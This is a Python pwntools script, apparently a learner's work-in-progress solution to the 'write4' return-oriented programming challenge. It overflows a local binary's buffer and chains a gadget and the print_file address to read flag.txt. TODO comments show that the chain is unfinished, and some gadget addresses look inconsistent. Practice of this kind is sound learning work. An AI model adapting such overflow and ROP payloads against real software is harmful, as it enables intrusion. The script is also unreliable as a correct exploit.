#!/usr/bin/python3

from pwn import *



io = process('./write4')


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc001ba5e)*2


# This is the vaddr of system
# First return to the location of the pop rdi

# 4   0x00400510 GLOBAL FUNC       print_file
printFile = p64(0x00400510)



back_junk = b"B" * 20




payload = junk + new_bp


# TODO How do I get the pointer to Flag.txt into $RDI
# 0x00007ffff7fea3a4: mov edi, dword ptr [rsp - 8]; ret;
# 0x00007ffff7fea3a3: mov rdi, qword ptr [rsp - 8]; ret;
placeGaget = p64(0x00007ffff7fea3a3)

#0x0000000000400693: pop rdi; ret;

# TODO the address of the string?
placeVal   = b"flag.txt"

payload += placeGaget + printFile + placeVal


# payload += printFile


payload += back_junk


print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

io.send(payload)

input("exploit sent hit enter to end")


print(io.clean(0.5).decode("utf-8"))


sleep(1)
